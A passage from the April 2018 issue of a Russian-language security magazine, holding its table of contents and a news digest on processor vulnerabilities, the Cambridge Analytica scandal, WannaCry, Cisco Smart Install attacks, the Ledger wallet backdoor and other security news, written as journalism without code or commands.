
                                                   Апрель 2018
            № 229
CONTENTS

   MEGANEWS
  Всё новое за последний месяц

    РКН vs Telegram
  История одного про тивостояния

    Дайджест Android
  Лучшие гайды, библиотеки и инструмен ты месяца

    Ис кусство форензики
  Теория, кни ги, курсы, полезные материалы

    Ис кусство форензики
  Источники дан ных, поиск и ана лиз артефактов

    Тул кит для форензики
  Выбира ем дистрибутив и набор соф та для кримина листического анализа

    Memcached как средство для DoS
  Как ошибка в кон фиге превратила полезную утилиту в хакерское оружие

    Небезопас ность WebApp
  10 горячих докладов с ИБ‐кон ферен ций

    Оружие массового заблужде ния
  Разбира ем 10 простых рецептов социальной инженерии

    Прослушка VoIP
  Как PRISM и BULLRUN извлекают информа цию из голосового потока

    Прессуем WordPress
  Как работа ет новый метод «класть» сайты на WordPress

     X‐Tools
  Под борка полезных хак‐тулз для сбора и ана лиза данных

    Как обма нуть криптокази но
  Пред ска зыва ем случай ные числа в умных кон трак тах Ethereum

    Хар дкорный взлом самошиф рующегося HDD
  Реверсим и хакаем внеш ний накопи тель от Aigo

    Друпал геддон‐2
  Под робно разбираем новую уязвимость в Drupal

   ОС для анонимуса
  Выбира ем дистрибутив с интегрирован ной защитой от слежки

   Вы носим всё!
  Ка кие дан ные о нас хра нит Google и как их вернуть себе через Takeout

    Заметаем следы
  Как унич тожить дан ные быс тро и безвозвратно

    Ис кусство удаленной отладки
  Готовим инс трумен тарий и разбира ем тон кости

   WWW
  Интересные веб‐сервисы

    Системный изолятор
  Изолируем про цессы в Windows средства ми Less Privileged App Container

     ][‐практика: беспощад ный буст многопоточ ного СРР‐кода
  Сравнение разных под ходов к написа нию разделя емых струк тур

    Задачи на собесе дованиях
  Полный разбор задач и награждение победи телей от HackerU

    Плохой Андроид
  Как производите ли превраща ют хорошую ОС в тормозное необновляемое убожество

     Тит ры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ЕЩЕ БОЛЬШЕ
ПРОБЛЕМ С
ПРОЦЕССОРАМИ
Но вые проб лемы AMD
В кон це марта 2018 года бы ла опуб ликована информация о три надцати кри‐
тических уязвимос тях, обна руженных в процес сорах AMD. Проб лемы были
поделе ны на четыре класса: RyzenFall, MasterKey, Fallout и Chimera.
  Изначаль но представите ли израиль ско го стар тапа CTS‐Labs не обна‐
родовали никаких тех нических деталей об этих багах, а компанию AMD уве‐
доми ли об уязвимостях менее чем за сут ки до раскрытия информации. Из‐за
это го CTS‐Labs подверглась жес ткой кри тике со стороны ИБ‐сообщес тва,
а некоторые эксперты сначала и вовсе отказались верить данным компании.
   Но, как оказалось, «тех нический» отчет и proof‐of‐concept эксплоиты
для опасных про цессорных уязвимостей существуют. В итоге информа цию
об уязвимос тях подтвердили признанные ИБ‐специалис ты, включая ком‐
панию Check Point, главу компании Cymmetria Гади Эврона (Gadi Evron), а так‐
же главу компании Trail of Bits Дэна Гви до (Dan Guido). Кроме того, руково‐
дитель CTS‐Labs Илья Лук‐Зильберман  (Ilia  Luk‐Zilberman) опуб ликовал
откры тое письмо, в котором пояснил позицию своей компании и рас ска зал,
почему считает неверным раз гла шение подробностей о таких проблемах
и тем более открытую пуб ликацию эксплоитов для них.
  Еще примерно неделю спус тя предста вите ли AMD тоже вынесли свой вер‐
дикт, сообщив, что завершили изучение данных об уязвимос тях и эксплоиты.
  CTO ком пании AMD Марк Пейпермастер (Mark Papermaster) расска зал, что
в целом инже неры AMD сог ласны с мнением коллег, которым также довелось
изучить эксплоиты CTS‐Labs и ознакомить ся с техническими деталя ми багов.
Проб лемы RyzenFall, MasterKey, Fallout и Chimera вряд ли можно пос тавить
на одну ступень с уязвимостями Meltdown и Spectre. Дело в том, что для экс‐
плу атации багов в процессорах AMD ата кующий должен пред варительно
скомпро метировать систему и получить права администратора. В сущ ности,
най денные  спе циалистами  CTS‐Labs проблемы действительно  опасны,
но они могут использовать ся для расширения и ухудшения атаки, но не
в качестве вектора для изначаль ной компромета ции системы.
  Пей пермастер пообещал, что патчи для всех уязвимос тей (в формате
обновления для BIOS) вый дут в ближай шее время, однако пока компания
не называет конкретных сро ков. Подробнос ти при ведены в таблице ниже.





                       Таб лица уязвимос тей


Сно ва Meltdown и Spectre
Кроме новых проблем, специалис там при ходит ся по‐прежнему занимать ся
и ста рыми. Так, до сих пор продолжается «эпопея» с исправлением уяз‐
вимос тей Meltdown и Spectre, для щаяся с янва ря 2018 года.
  В начале апре ля компания Intel опуб ликовала очередной вариант сво его
руководс тва по обновлению мик рокодов, в котором приз нала, что устранить
Meltdown и Spectre на всех про цессорах все же не удас тся. Проблема, в час‐
тнос ти, заключается в уязвимости Spectre вари ант 2 (CVE‐2017‐5715), которую
оказалось невоз можно испра вить в ряде про цессоров, выпущенных пример‐
но в 2007–2010 годах.
  В новой версии докумен та статус готовности патчей для Meltdown и Spec‐
tre для некоторых про цессоров изменился на Stopped — это означает, что
разработка «зап латок» для этих продуктов была прекращена. В компании
поясняют, что «после тщательного изучения микроархитектур и функци ональ‐
ных воз можнос тей микрокодов для данных продук тов Intel приняла решение
не выпускать обновленные мик рокоды для данных решений по одной
или более при чине». Сами возможные причины также были преданы огласке:
 • харак теристики микроархитек туры дела ют невозможной практическую
   имплементацию функций, позволя ющих устранить Spectre вари ант 2 (CVE‐
   2017‐5715);
 • ограниченная, приобре таемая отдель но поддержка ПО;
 • согласно данным, полученным от клиентов, большинство этих продуктов
   применяются в «закрытых сис темах», сле довательно, вероятность исполь‐
   зования означенных уязвимос тей для них очень мала.

В ито ге ста тус Stopped получи ли пат чи для Bloomﬁeld, Bloomﬁeld Xeon, Clarks‐
ﬁeld, Gulftown, Harpertown Xeon C0 и E0, Jasper Forest, Penryn/QC, SoFIA 3GR,
Wolfdale, Wolfdale Xeon, Yorkﬁeld и Yorkﬁeld Xeon. В новый список вошли мно‐
жество моделей Xeons, Core, Pentium, Celeron и Atom, прак тически все, что
произво дила  Intel. Боль шинс тво процессоров, для которых разработка
исправ лений оказалась невозможной, были выпущены в 2007–2010 годах.
  Нужно отметить, что вмес те с этим обновился статус патчей для семей ств
Arrandale,  Clarkdale,  Lynnﬁeld,  Nehalem  и  Westmere.  Теперь,  согласно
документу, эти исправ ления находятся «в работе».
  Предста вители Intel сообщают, что в настоящий момент компания пол‐
ностью завершила работу над пат чами для процессоров, вышедших за пос‐
ледние девять лет.
  В середине апре ля компания AMD, в свою очередь, наконец выпустила
микрокоды, исправ ляющие Spectre вариант 2 (CVE‐2017‐5715). Теперь патчи
представлены для про дуктов вплоть до 2011 года выпус ка (до процес соров
Bulldozer). Разработчики распространили эти «зап латы» сре ди производите‐
лей ПК и материнских плат, что бы те включили обновления в сос тав BIOS.
  Ранее всяческую помощь в распространении пат чей производите лям
предложила ком пания Microsoft, поэто му в рамках апрель ского вторника
обновлений был представ лен пакет KB4093112 (пока только для Windows 10).
В состав это го обновле ния вошли патчи ОС‐уровня, которые также соз даны
для пользовате лей AMD и нап равле ны на устранение Spectre вари ант 2.
  От мечу, что в январе текущего года Microsoft уже пыталась выпустить
исправ ления, которые оказали неожи данный эффект на процес соры AMD (в
час тности, серии Athlon 64 X2). Оказалось, что иног да после уста новки патчей
(а именно KB4056892) сис темы на базе CPU AMD просто перестают заг‐
ружать ся, показывают «синий экран смер ти» и так далее. В итоге распростра‐
нение патчей экс тренно при останови ли и лишь спус тя несколько недель
возоб новили,   устранив   баги.  Инте ресно,   что   в   состав   нового
KB4093112 не входят эти изна чаль ные январские пат чи, так что пользователям
придет ся устанав ливать оба пакета.
  В AMD также подчерки вают, что полное исправление уязвимос тей в про‐
цессорах компании тре бует одновременно уста новки микрокодов, получен‐
ных от про изво дите лей железа, и установки пат чей для опе раци онной сис‐
темы.


ТОЛЬ КО 5% САЙТОВ В ИНТЕРНЕТЕ ИСПОЛЬЗУЮТ FLASH


Ана лити ки компании W3Tech сообщили хорошую новость: доля использования Flash в интерне‐
те продолжает сни жаться и в нас тоящее время сос тавляет лишь 4,9% (по сравнению с 28,5%
в 2011 году). Стоит заметить, что речь идет об интернете в целом, а не о миллионе или десяти
тысячах самых посещаемых сайтов.


Выводы W3Tech под твержда ют ста тистику, озвученную ранее инженерами компании Google.
Так, еще в феврале 2018 года специалисты сообщали, что пользователи Chrome сталкиваются
с Flash на 80% реже, чем в 2014 году. То есть в начале 2018 года таких слу чаев было лишь
8%.





ВСЕ НЕНАВИДЯТ
FACEBOOK
Cambridge Analytica
В кон це марта 2018 года компания Facebook ока залась в центре масштаб‐
ного скандала. Ста ло извес тно, что несколь ко лет назад бри танская компания
Cambridge Analytica сумела заполу чить информа цию о десятках миллионов
поль зовате лей  Facebook  (без  их  ведома). Причем  данные  собирали
под видом про веде ния простого опро са, для учас тия в котором нужно было
вой ти через соци альную сеть. Отмечу, что изначально речь шла о дан‐
ных 50 миллионов человек, но позже стало известно, что настоящее количес‐
тво пострадав ших — 87 миллионов.
   Таким образом было «опрошено» око ло 270 тысяч человек, но в те
далекие вре мена API соци аль ной сети также позволял собрать данные
о друзьях этих пользователей, что в итоге и принес ло «иссле дова телям»
информацию о миллионах юзеров. Затем эти данные были исполь зованы
для сос тавле ния психологических портретов и разработ ки персонали зиро‐
ванной рекламы.
   Так как основной век тор работы Cambridge Analytica — алгоритмы анализа
полити ческих предпочте ний изби рателей, данные участни ков соци аль ной
сети были исполь зованы во время десят ков избирательных кампаний в раз‐
личных странах мира.
  В ито ге Facebook обви нили в нап левательском отношении к данным своих
поль зовате лей, халатности и замалчивании случившегося, а Cambridge Ana‐
lytica подозрева ют едва ли не в связях со спецслуж бами и вли янии на резуль‐
таты выборов (в том чис ле американских). Весь мир в одночасье заговорил
о том, какая огромная ответственность лежит на компани ях, с которыми поль‐
зователи сами с радостью делят ся своими личными данными. И какую
неверо ятную ценность весь этот материал представляет для маркетологов,
полито логов и мно гих других заин тересованных лиц.
  Лишь спус тя несколь ко дней после начала скандала Facebook прервала
затянув шееся мол чание и Марк Цукерберг стал приносить извинения от лица
всей компании. Однако это уже не оста новило массовую акцию в социальных
сетях, которая обзавелась «говорящим» хеш тегом #deletefacebook. Кам‐
панию по уда лению учетной записи в соци альной сети поддержали многие
известные личности, включая Стива Возняка (Steve Wozniak), соосновате ля
WhatsApp Брайана Акто на (напомню, что WhatsApp принадлежит Facebook,
но Актон более не работает в компании) и даже Илона Маска, который стер
из Facebook аккаунты SpaceX и Tesla. На этом фоне на Facebook ожи даемо
посыпались судеб ные иски, а акции компании значительно потеряли в цене.
  В середи не апре ля из‐за скандала, разразившегося вокруг Cambridge An‐
alytica и Facebook, Марк Цукерберг даже выс тупал на слушаниях в конгрессе
США  (перед  членами  торгового  и  финансового  комите тов).  Теперь
в интернете сно ва шутят о том, что Цукерберг — реп тилоид или робот, а в
конгрессе он про ходил тест Тьюринга.


Слеж ка за юзе рами
По ка первые полосы СМИ во всем мире прочно занима ла история Cambridge
Analytica, журналис ты издания Ars Technica и ИБ‐исследователи обна ружили,
что в распоряже нии Facebook было куда больше их личных данных, чем они
полага ли.
  Дело в том, что, ког да кампания #deletefacebook набрала популярность,
многие спе циалис ты ста ли рекомендовать пользователям перед удалением
учет ной записи Facebook скачать архив со всей своей информацией, ведь
социальная сеть пре доставляет такую возможность.
   Вско ре в Сети начали появ лять ся мно гочисленные сообщения от людей,
которые пос тупили именно так и с удив лени ем обна ружи ли в полученных
архивах метаданные обо всех звонках, SMS и MMS за последние несколько
лет. Архи вы содержали имена контактов, телефонные номера, продолжитель‐
ность звонков, даты и так далее.





                      При мер метаданных

Ког да журналис ты Ars Technica обратились за пояснениями к предста вителям
Facebook, в ком пании ответили, что ключевая особенность при ложе ний
и сервисов Facebook — это уста нов ление связей между пользователями, что‐
бы тем было легче отыскать нужных людей. Для этого во вре мя первого входа
в мессенджинговое или соци альное при ложение у пользователя запрашива‐
ют разрешение на дос туп к кон тактам, хранящимся в телефоне, причем поль‐
зователь может отказать ся сразу или позже уда лить загруженные контакты
через браузер. Оче видно, кон такты играют важ ную роль в работе алгоритма
рекомендации друзей.
   Вско ре удалось разобрать ся и в том, почему многие поль зователи даже
не подоз ревали о том, что выдали Facebook все необходимые разрешения
для слежки за самим собой. Как оказалось, проблема кос нулась только поль‐
зователей Android‐при ложений.
  Выясни лось, что лишь в последнее время при ложения Messenger и Face‐
book Lite ста ли оче видным образом предупреждать пользователей о своем
намере нии получить дос туп к логам SMS и журнала вызовов. На ста рых
устрой ствах, со старыми версиями Android (например, 4.1 — Jelly Bean)
на бор ту, само разрешение на доступ к контактам устройства также под‐
разуме вало доступ к логам сообщений и вызовов. Хуже того, в редакции Ars
Technica приш ли к выводу, что, даже когда разработчики Android поменяли
струк туру работы разрешений и внесли изменения в Android API, раз работ‐
чики Facebook нарочно продолжили использовать ста рую версию, что поз‐
воляло им получать доступ к информации о звонках и SMS, откры то не уве‐
домляя об этом поль зовате лей.
  В ответ на поднявшийся в СМИ шквал новых обвинений (на этот раз
в слежке за пользовате лями с не совсем ясными намере ниями) предста вите‐
ли Facebook опуб ликова ли официаль ное сооб щение. В нем компания вновь
подчеркну ла, что все разрешения Android‐при ложениям поль зователи пре‐
доставляли исключительно доброволь но, понимая, что дела ют. Также под‐
черки валось, что контакты, историю звонков и сообщений, которыми человек
«поделился» с Facebook, можно уда лить. Представите ли Facebook вновь
отме тили, что собранная информация исполь зовалась для того, чтобы «поль‐
зователи мог ли оста вать ся на связи с людьми, которые им небезразличны»,
а также метаданные яко бы помога ли улучшать опыт взаимодей ствия с соци‐
аль ной сетью.
  Ин тересно, что журналис ты Ars Technica оспаривают эти заявления. Изда‐
ние приводило в пример сразу несколь ко исто рий пользовате лей, которые
уве ряют, что никог да не давали приложениям Facebook раз решение на дос‐
туп к логам вызовов и сообщений, не получали оче видных уве домлений
об этом и даже не подозревали о такой активности со стороны соци альной
сети.


Bug bounty
Так как одних извинений за случившееся было определенно недос таточно,
предста вите ли Facebook пообещали, что не прос то «закрутят гайки» для сто‐
ронних приложе ний, использующих API соци альной сети (эти обе щания уже
час тично сдержали), но так же расширят свою программу воз награждения
за уязвимости, чтобы поощрить поль зователей и экспертов искать признаки
потенциаль ного злоупотребления данными (data abuse).
   10 апреля 2018 года bug bounty программа Facebook действительно бы ла
обновлена, и теперь люди, обнаружившие прес ловутый data abuse в сторон‐
нем  при ложе нии,  могут  получить  за  это  вознаграждение  в  размере
до 40 тысяч долларов. Причем предста вители социальной сети пишут,
что 40 тысяч — это не максимум, в осо бо сложных случаях раз мер воз награж‐
дения может быть уве личен.
  Под словосо чета нием «злоупотребление данными» подразумевает ся, что
приложе ние собирает данные поль зователей Facebook, которые затем
передаются треть им сто ронам, где информация может быть перепродана,
похище на, исполь зована с целью мошенничества или получе ния полити чес‐
кого влияния.
  Предста вители Facebook сообщают, что, если факт злоупотребле ния дан‐
ными  будет подтвержден, работа при ложения‐нарушителя  будет  прек‐
ращена. Также соци альная сеть оставля ет за собой пра во обра тить ся со всей
собранной информацией в правоохранитель ные органы или  суд, если
это будет необ ходимо.


WANNACRY ВСЕ ЕЩЕ УГРОЖАЕТ МИЛЛИОНАМ КОМПЬ‐
ЮТЕРОВ
Специалисты компании Kryptos Logic предупрежда ют, что угроза от шиф ровальщика WannaCry
по‐преж нему существенна. Именно в этой ком пании работает ИБ‐специалист Маркус Хатчинс
(Marcus Hutchins), более известный под псевдонимом MalwareTech. Это его старани ями эпи‐
демию WannaCry удалось остановить в мае 2017 года.
    Тогда  Хатчинс  нашел  в  коде  вредоноса  аварийный  «стоп‐кран»:  оказалось,  что
перед началом работы малварь обращается к домену iuqerfsodp9ifjaposdfjhgo‐
surijfaewrwergwea.com, проверяя, существует ли он. Если домен не зарегистрирован,
малварь начина ет шифровать файлы. Однако если домен сущес твует, вымогатель останавлива‐
ет процесс заражения. MalwareTech зарегистрировал домен и, по сути, остановил рас простра‐
нение WannaCry.

По данным Kryptos Logic, около 100 000 000 обра щений к домену «стоп‐крану» было обна‐
ружено в одном только марте 2018 года.

Обращения к «ава рий ному» домену исходили с 2 700 000 уникальных IP‐адресов.


   Ос новная при чина миллионов до сих пор активных заражений — это отсутствие пат ча
MS17‐010, выпущенного Microsoft еще в марте 2017 года. Патч устраняет «дыры» в SMB,
которые эксплуати рует WannaCry. Ниже приведены при меры сценари ев, при которых WannaCry
пред ставляет опасность для малого бизнеса и крупных компаний.





GOO.GL И TOR MES‐
SENGER ВСЁ
Goo.gl
Предста вите ли ком пании Google анонсировали ско рое прекращение работы
сервиса для сок ращения ссылок goo.gl, запущенного в далеком 2009 году.
Разработчики пишут, что с тех пор утекло много воды, на рынке появилось
множес тво ана логичных про ектов, а потом мобильные устрой ства, голосовые
ассистенты и приложе ния вообще изменили интернет до неузнава емос ти.
По мне нию Google, в настоящее время в сервисе для сокращения ссылок
боль ше нет нужды.
  С 13 апре ля 2018 года компания начала использовать вместо goo.gl
«интеллек туальные», динами ческие ссылки Firebase (Firebase Dynamic Links,
FDL). Так же после указанной даты анонимные и новые поль зователи более
не могут соз давать новые ссылки goo.gl. В качестве альтернативы Google
предложила исполь зовать уже упомяну тый Firebase или услуги сервисов Bitly
и Ow.ly.
   Кон соль goo.gl будет дос тупна зарегистри рованным пользовате лям, уже
имеющим короткие ссыл ки, до 30 марта 2019 года. По истечении этого срока
сущес твующие ссылки продолжат перенап равлять пользовате лей по нужному
адре су, однако дос туп к консоли и добав ление новых URL будут закрыты. То
есть миграцией на новый API при дется озаботить ся заранее.


Tor Messenger
По хожее сообщение появи лось в этом месяце и в офи циаль ном блоге раз‐
работчиков Tor Project. Было объявле но о прекращении разработ ки аноним‐
ного мессендже ра  Tor  Messenger,  который был  представ лен  публике
в 2015 году. К сожале нию, за про шедшее время проект так и не сумел выйти
из ста дии бета‐тес тирования. В своем сообщении разработчики подробно
объясни ли, почему это произош ло, и перечислили доводы в пользу прек‐
ращения разработки.
  Изначаль но планиро валось, что Tor Messenger пре доставит пользовате‐
лям более защищенный кросс‐платформенный канал для общения, чья
безопасность реализована за счет того, что весь трафик мес сендже ра про‐
ходит через Tor, а так же за счет OTR‐шифрования. Напомню, что мессенджер
поддержи вал Jabber (XMPP), IRC, Google Talk, Facebook, Twitter и так далее.
   Разработ чики  полага ли,  что  Tor  Messenger  будет  использовать ся
как средс тво для общения через уже существующие социальные сети и IM.
И хотя модель работы клиент‐сервер предполагает, что метаданные поль‐
зователей все же мог ли оседать на сторонних серверах, прос ледить их путь
до сервера, а также разобрать ся в зашифрованных посредс твом OTR сооб‐
щени ях было бы опре деленно трудно.
   Хо тя разработчики пишут, что сама идея, лежащая в основе Tor Messenger,
по‐прежнему видит ся им разумной и «рабочей», 11 бета‐версий спустя раз‐
работку все же решено было прекратить. В блоге названы три основные при‐
чины, по которым это решение было при нято.
   Во‐первых, Tor Messenger был построен на базе клиента Instantbird, неког‐
да созданно го сообществом Mozilla. К сожалению, разработка это го проекта
была  прекращена  в  2017  году,  хотя  часть  функций  перекочева ла
в Thunderbird.
   Во‐вторых, проблема метаданных, которые все же сохраняются на сто‐
ронних серверах, оказалась более значитель ной, чем предполагалось изна‐
чально, и с этим разработ чики Tor Messenger ничего сделать не могли.
К сожалению, третьи лица по‐прежнему могли выявить шаблоны поведе ния
поль зовате лей, и метаданных вполне хва тает, что бы понять, с кем именно
общается человек и как час то.
   В‐треть их, разработ чики признают ся, что у них поп росту не хва тило ресур‐
сов. Даже пос ле 11 выпущенных версий Tor Messenger по‐прежнему находил‐
ся на ста дии бета‐тес тирования и никог да не проходил внешний аудит (толь‐
ко два внут ренних). Предста вители Tor Project признали, что из‐за нех ватки
людей им при ходилось игнорировать пожела ния пользовате лей и даже
баг‐репорты, что опре деленно не шло про екту на пользу.
  Пос ле прекращения разработки Tor Messenger пользовате лям, которым
все же важна при ват ность и защита коммуникаций, рекомендуют ознакомить‐
ся с темати ческим цик лом статей Фонда электронных рубежей. Тем поль‐
зователям, которым нужен именно XMPP, разработчики совету ют обратить
внимание на CoyIM.





→«Пользователи предоставляют все подробности сво ей жизни Facebook, и... используя это,
Facebook зараба тыва ет огромные деньги на рекламе. Все их прибыли базируются на информа‐
ции пользователей, но сами пользователи не получа ют вза мен никакой выгоды. Apple делает
деньги на хороших продуктах, а не на вас. А в случае с Facebook, как при нято говорить, про‐
дукт — это вы»
— Стив Возняк о том, почему он уда лил свой аккаунт с Facebook





                                     Продолжение статьи →
← Начало статьи





 АУТЕНТИФИКАЦИЯ
 БЕЗ ПАРОЛЕЙ
  Консорциум W3C (World Wide Web Consortium, «Консорциум Все мирной
   паутины») и альянс FIDO (Fast IDentity Online) начали работу над Web Authenti‐
   cation (WebAuthn) еще в 2015 году. Напомню, что данный API позволяет поль‐
  зователям  входить  в  Google,  Facebook,  Dropbox,  GitHub и  так далее
  при помощи аппаратных ключей YubiKey.
    На базе FIDO 2.0 Web API был разработан WebAuthn, который обладает
  более широкими возможностями и в теории позволя ет отказаться от исполь‐
  зования паролей вооб ще. Так, WebAuthn предлагает использовать для аутен‐
  тификации на сайтах и в приложениях аппаратные ключи, отпе чатки пальцев,
  распознавание лиц, сканы радужной оболочки глаза и прочую биометрию.





                         FIDO 2.0 Authentication

  Своеобразным «компаньоном» WebAuthn ста нет протокол Client to Authentica‐
   tor (Client to Authenticator Protocol, CTAP). Как следует из названия, основная
  роль CTAP — это установление связи меж ду бра узером и сторонней сис‐
  темой аутентификации, к примеру NFC или USB‐клю чом, сканером отпе чат‐
   ков пальцев в смартфоне или ноутбуке. Специалисты W3C объясняют, что
  для обеспечения работос пособности новой аутентификационной схе мы оба
   API должны работать сообща.
     Так как Google, Microsoft и Mozilla уже объявили, что поддержат раз работ‐
   ку, ожидается, что поддержка WebAuthn API появится в Chrome, Edge и Firefox
   в самом скором времени. Так, WebAuthn заработает в Chrome 67 и Firefox 60,
  чей релиз запланирован пример но на май 2018 года.
    Ожидается,  что  эта  раз работка  поможет  защитить  пользовате лей
   от фишинга, краж паролей и даже атак типа «человек посередине» (man‐in‐
   the‐middle). Ведь ИБ‐специалисты давно пришли к выводу, что исполь‐
  зование паролей вряд ли мож но наз вать хорошей практикой.


  5 000 000 СМАРТФОНОВ С ПРЕДУС ТАНОВЛЕННОЙ МАЛ‐
 ВАРЬЮ

   Специалисты Check Point рассказали о крупном ботнете, сос тоящем из 4 964 460 Android‐
   устройств. Все гаджеты заражены вредоносом RottenSys, который активен как минимум
   с 2016 года.


   RottenSys встречает ся в основном на китайском рынке и рас пространяется сов местно с китай‐
   скими приложениями (Google Play Store не работает в Китае, и большинство пользователей
   устанавливают приложения из сторонних каталогов). Неудивительно, что зараже ны оказались
   преимущественно популярные в Поднебесной гаджеты.





   Почти половина этих устройств рас пространялись через китайскую компанию Tian Pai —
   это позволяет предположить, что некий инсайдер или груп па инсайдеров устанавливали
   на смартфоны зараженные RottenSys приложения. И это происходило еще до того, как гаджеты
   поступали в продажу.





 ЦИСКИ ПОД АТАКОЙ
  В начале апреля была опубликована информа ция о критической уязвимости
   CVE‐2018‐0171, которую обнаружили в составе Cisco IOS Software и Cisco IOS
  XE Software. Проб лема набрала 9,8 балла по шкале CVSS.
     Уязвимость связана с некорректной валида цией пакетов в клиенте Cisco
  Smart Install (SMI). Так как разработчики Cisco уже выпус тили патчи для обна‐
  руженного бага, исследователи опуб ликова ли не толь ко описание проблемы,
  но и proof‐of‐concept экс пло ит. Для экс плуатации этой проблемы атакующему
  достаточно обратиться к TCP‐порту 4786, который открыт по умол чанию, что
   в итоге ставит уязвимые коммутаторы Cisco перед угрозой неаутентифици‐
  рованной RCE‐атаки.
     Кроме того, эксперты Cisco Talos опуб ликовали предупрежде ние, также
  связанное с SMI, однако не имеющее отно шения к упомянутой уяз вимос ти.
  Специалисты предупрежда ли, что пра вительственные хакеры атакуют неп‐
  равильно сконфигурированные устройства  Cisco. По данным компании,
  администраторы зачастую не отключают про токол Smart Install дол жным обра‐
   зом, в результате чего устройства постоянно находятся в режиме ожидания
  новых команд на установку и конфигура цию. Так, массовые сканирования,
  призванные обнаружить коммутаторы с открытыми портами 4786, начались
  еще в феврале 2017 года, прекратились в октябре 2017‐го, а затем возоб‐
  новились текущей весной.
    В частности, аналитики Cisco Talos ссылались на недавнее пре дупрежде‐
  ние US‐CERT, в котором сооб щалось, что свя занные с рос сийскими влас тями
   хак‐группы, известные под кодовыми именами Dragonﬂy, Crouching Yeti и En‐
   ergetic Bear, пытаются атаковать объекты ключевой инфраструктуры США.
     Как оказалось, ИБ‐эксперты предупрежда ли об опас ности совсем не зря.
  Хакерская группа, судя по всему называющая себя JHT, атаковала уязвимые
  устройства Cisco, сосредоточив свои уси лия на Иране и Рос сии. Одними
  из первых на происходящее обратили внимание специалисты «Лаборатории
  Касперского».



         «Некая груп пиров ка использует уяз вимость в программе под наз вани-
       ем Cisco Smart Install Client, чтобы получить воз можность исполнять
        произвольный код на устройстве. Злоумыш ленники переза писы вают
        образ сис темы Cisco IOS и меняют конфигура ционный файл, оставляя
         в нем пос лание „Do not mess with our elections“ („Не вме шивайтесь
         в наши выборы“)», — сообщили ана литики «Лабора тории Кас пер ского»
        и проиллюс трирова ли свои слова скриншотом, который можно уви-
         деть ниже.





                    Do not mess with our elections

  Эксперты предположили, что атакующие исполь зуют для поиска уязвимых
  девайсов поисковик Shodan или даже собственную утилиту Cisco. По данным
   Cisco Talos, таким образом можно обнаружить более 168 тысяч устройств
  с активным SMI, и проб лем с выбором целей у злоумышленников определен‐
  но не возникло.
    По данным Reuters, иранское Министерство информационно‐коммуника‐
  ционных технологий насчитало более 200 тысяч пос традавших от атак устрой‐
   ств по всему миру, из которых 3500 находятся на территории Ирана.
    Журналистам издания  Vice  Motherboard и вовсе  удалось  связаться
  с хакерами по указанному в их сообщени ях email‐адресу и задать несколько
  вопросов. Атакующие утвержда ют, что «просто хотели послать сообщение»
  и атаковали Россию и Иран в ответ на многочисленные атаки со стороны
  «правительственных хакеров» этих стран (на США и не только). Кроме того,
  злоумышленники заявили, что ска ниро вали и дру гие страны, но в США
  и Великобритании использовали команду no vstack, отключая Smart Install
  и таким образом защищая ранее уяз вимые коммутато ры.


  СЛУЧАЙНЫЕ DDOS‐АТАКИ — ПРОБЛЕМА ДЛЯ БИЗНЕСА
   Эксперты «Лаборатории Касперского» под считали, что каждая пятая компания в Рос сии ста‐
   новится жертвой DDoS‐атак случайно. Исследование было проведено совместно с компани ей
   B2B International, и в опросе приняли участие более 5200 IT‐спе циалистов из 29 стран мира,
   включая Россию.

  21% респондентов отметили, что их организация не была прямой целью DDoS‐атаки, но все
   равно пострадала.

   При этом 34% компаний до сих пор не используют никакой защиты от DDoS, потому что
   полагают, что они не представляют интереса для злоумышленников.

  В 2017 году 42% российских ком паний стал кивались именно с DDoS‐атаками. В 2016 году
   этот показатель был в два раза ниже — 22%.

  31% опрошенных уверены, что DDoS‐атака проводится, чтобы нарушить нормальную операци‐
   онную деятельность компании. Еще 23% считают, что это про иски конкурентов. 19% рес‐
   пондентов полагают, что DDoS используется для отвлечения внимания IT‐служб от других атак,
   которые направлены на компанию в это же время.





 ПОДРОСТОК
 ВЗЛОМАЛ
 КОШЕЛЬКИ LEDGER
  Французская компания  Ledger, производящая одноименные аппаратные
  кошельки для хранения криптовалю ты, всег да демонс трировала завидную
   уверенность в защищен ности своей продукции. Механизм «криптографичес‐
  кой аттестации», который используют продукты Ledger, якобы стопроцентно
  защищает пользователей от подделок, так как на кошельке может быть
  запущен только авторизованный код.





    Компания Ledger так гордится защищенностью своих устрой ств, что
    не заклеивает коробки специальными стикера ми, сигнализирующими
    о вскрытии

  В 2015 году представители Ledger и вовсе утвержда ли, что атакующие ни за
   что не сумеют подменить или модифицировать прошивку аппаратных кошель‐
   ков и пройти аттестацию, не зная приватного клю ча. В связи с этим разработ‐
   чики сообщали, что кошелек Ledger можно без опасений при обретать даже
  на eBay.
    Однако заявления о полной безопасности продукции Ledger были пос‐
   тавлены под сомнение 15‐летним подростком из Великоб ритании по имени
  Салим Рашид (Saleem Rashid). В своем лич ном блоге Рашид опубликовал
  подробный материал, посвященный ком промета ции устройств Ledger Nano S
  и Ledger Blue.
    Видеодемонстрацию атаки мож но увидеть ниже.





  Рашид описал и продемонс трировал в работе proof‐of‐concept эксплоит, поз‐
  воливший ему установить на устройства незаметный бэкдор, объ емом все‐
   го 300 байт. Атаку можно отнести к типу evil maid — «злая горничная», то есть
   атакующий должен иметь хотя бы беглый физичес кий доступ к устройству,
   как горничная, убирающая номер в мотеле.
     После компрометации  и  установки  бэкдора  устрой ство  генерирует
  заранее заданные адреса кошельков и вос ста навливает пароли таким обра‐
   зом, что они известны атакующему. В результате злоумышленник сможет
  выпол нять самые разные противо законные действия, в том чис ле переадре‐
   совать любой криптовалютный платеж на собственный адрес.
     Рашид обнаружил проб лему еще в нояб ре 2017 года и уведомил о ней
  разработчиков. В мар те 2018 года раз работчики Ledger выпустили патч
  для модели Nano S. При этом директор по безопас ности Ledger подчеркнул,
   что исправ ленная проблема не была кри тичес кой, а атака не позволяла
  извлечь приватные ключи или seed.
     Также разработчики писали, что сроки выхода патча для Ledger Blue пока
  неизвестны, но завери ли, что бэкдор Рашида обна руживается при подклю‐
  чении устройств Ledger к серверам компании (для загрузки приложений
  или обновле ния прошивки). Однако раз вернутый отчет исследователя, опуб‐
  ликованный уже после выхода исправления, доказал, что представители
  Ledger не совсем правы.
     Рашид объясняет, что еще не про верял, ней тра лизует ли свежий патч
  для Nano S обнаруженную им проблему, но он сомневается в том, что бэкдор
  нельзя будет адаптировать для работы с пропат ченны ми кошельками. Дело
   в том, что проблема, по сути, носит аппа рат ный характер.
      Так, устройства Ledger Blue и Nano S укомплектованы микроконтрол‐
  лерами ST31H320 производства компании STMicroelectronics. Именно с их
